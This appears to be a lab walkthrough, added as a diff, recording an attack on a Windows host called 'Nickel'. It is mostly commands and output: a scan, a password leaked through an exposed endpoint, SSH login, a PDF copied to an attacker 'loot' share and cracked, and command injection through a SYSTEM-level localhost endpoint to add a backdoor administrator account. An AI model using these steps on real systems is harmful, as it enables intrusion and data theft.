@@ -1,0 +1,141 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.192.99 > Nickel.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
+|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
+|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: NICKEL
+|   NetBIOS_Domain_Name: NICKEL
+|   NetBIOS_Computer_Name: NICKEL
+|   DNS_Domain_Name: nickel
+|   DNS_Computer_Name: nickel
+|   Product_Version: 10.0.18362
+|_  System_Time: 2026-05-06T02:40:43+00:00
+|_ssl-date: 2026-05-06T02:41:49+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=nickel
+| Issuer: commonName=nickel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-12-06T11:11:21
+| Not valid after:  2026-06-07T11:11:21
+| MD5:     dd00 d371 be60 8a7c 16e9 c5b0 66db 44ff
+| SHA-1:   13a0 09d0 7f52 335b e876 c1c4 b956 6f6a d748 deb0
+|_SHA-256: 9820 3d1c ae16 0501 f851 183e 900c acf3 bede 54aa 6267 3a08 c27c 709c ddff f308
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| http-methods: 
+|_  Supported Methods: GET
+|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
+|_http-title: Site doesn't have a title.
+33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| http-methods: 
+|_  Supported Methods: GET POST
+|_http-title: Site doesn't have a title.
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-05-06T02:40:47
+|_  start_date: N/A
+
+
+view-source:http://192.168.192.99:8089/
+Found something like:
+<form action='http://169.254.144.247:33333/list-current-deployments' method='GET'>
+<input type='submit' value='List Current Deployments'>
+Go: http://192.168.192.99:33333/list-current-deployments
+Cannot "GET" /list-current-deployments
+
+$ curl -X POST http://192.168.192.99:33333/list-current-deployments
+HTTP Error 411. The request must be chunked or have a content length.
+
+$ curl -X POST http://192.168.192.99:33333/list-current-deployments -H 'Content-Length: 0'
+<p>Not Implemented</p>
+
+$ curl -X POST http://192.168.192.99:33333/list-running-procs -H 'Content-Length: 0'
+
+Found : 
+name        : cmd.exe
+commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+
+Decode base64 Tm93aXNlU2xvb3BUaGVvcnkxMzkK:NowiseSloopTheory139
+
+$ ssh ariah@192.168.192.99
+ariah@192.168.192.99's password: 
+Microsoft Windows [Version 10.0.18362.1016]         
+(c) 2019 Microsoft Corporation. All rights  reserved.       
+ariah@NICKEL C:\Users\ariah>
+Found folder ftp have a pdf file. copy to kali, found it is password protected.
+PS C:\ftp> copy Infrastructure.pdf //192.168.45.233/loot
+$ pdf2john Infrastructure.pdf    then hashcat -m 10500                      
+Infrastructure.pdf:$pdf$4*4*128*-1060*1*16*14350d814f7c974db9234e3e719e360b*32*6aa1a24681b93038947
+f76796470dbb100000000000000000000000000000000*32*d9363dc61ac080ac4b9dad4f036888
+567a2d468a6703faf6216af1eb307921b0:ariah4168
+
+use password to open pdf.
+Infrastructure Notes
+Temporary Command endpoint: http://nickel/?  ## COMMAND ENDPOIT
+Backup system: http://nickel-backup/backup
+NAS: http://corp-nas/files
+
+PS C:\Windows> netstat -ano
+TCP    127.0.0.1:80           0.0.0.0:0              LISTENING       4
+Try curl from inside.
+ariah@NICKEL C:\Users\ariah>curl http://localhost/
+<!doctype html><html><body>dev-api started at 2025-12-07T05:47:35
+
+        <pre></pre>
+</body></html>
+ariah@NICKEL C:\Users\ariah>curl http://localhost/?whoami
+<!doctype html><html><body>dev-api started at 2025-12-07T05:47:35
+
+        <pre>nt authority\system
+</pre>
+</body></html>
+
+# To create a username test with password test123!
+net user test test123! /add
+
+# To add to the administrator and RDP groups
+net localgroup Administrators test /add
+net localgroup 'Remote Desktop Users' test /add
+
+URL encode:
+net%20user%20test%20test123!%20%2Fadd
+net%20localgroup%20Administrators%20test%20%2Fadd
+net%20localgroup%20%27Remote%20Desktop%20Users%27%20test%20%2Fadd
+
+Saw port 3389 open.
+$ xfreerdp3 /u:'test' /p:"test123\!" /v:192.168.192.99 /cert:ignore
+RDP in with user test in Administrator group
+
+################################################################################
+Key learning:
+create user add in administrator group.
+Try curl inside target in reverse shell, if netstat found new internal open port.
+Command Endpoint is a big hint that can try run cmd after localhost/?
+
+
